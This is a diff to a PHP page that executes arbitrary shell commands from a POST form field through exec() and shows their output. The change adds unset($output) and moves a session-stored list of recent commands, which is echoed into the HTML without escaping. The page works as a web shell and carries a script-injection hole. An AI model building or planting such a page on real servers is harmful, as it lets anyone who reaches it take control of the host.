@@ -20,6 +20,7 @@ if (isset($_POST['cmd'])) {
         $trim = 'nohup '.$trim.' > /dev/null 2>&1 & echo $!';
     }
 
+    unset($output);
     exec($trim, $output);
     echo '<pre>';
     foreach ($output as $line) {
@@ -50,6 +51,14 @@ echo '</pre>';
 </form>
 
 <br>
+<strong>Last commands:</strong>
+<ul>
+    <?php foreach ($_SESSION['last_cmds'] as $i => $cmd) { ?>
+        <li>
+            <a href="#" id="cmd<?= $i ?>" onclick="document.getElementById('cmd').value = document.getElementById('cmd<?= $i ?>').innerHTML"><?= $cmd ?></a>
+        </li>
+    <?php } ?>
+</ul>
 <strong>Utils:</strong>
 <ul>
     <li>
@@ -58,12 +67,4 @@ echo '</pre>';
     <li>
         <a href="#" onclick="document.getElementById('cmd').value = '.apt/usr/lib/p7zip/7z '">7z</a>
     </li>
-</ul>
-<strong>Last commands:</strong>
-<ul>
-    <?php foreach ($_SESSION['last_cmds'] as $i => $cmd) { ?>
-        <li>
-            <a href="#" id="cmd<?= $i ?>" onclick="document.getElementById('cmd').value = document.getElementById('cmd<?= $i ?>').innerHTML"><?= $cmd ?></a>
-        </li>
-    <?php } ?>
 </ul>
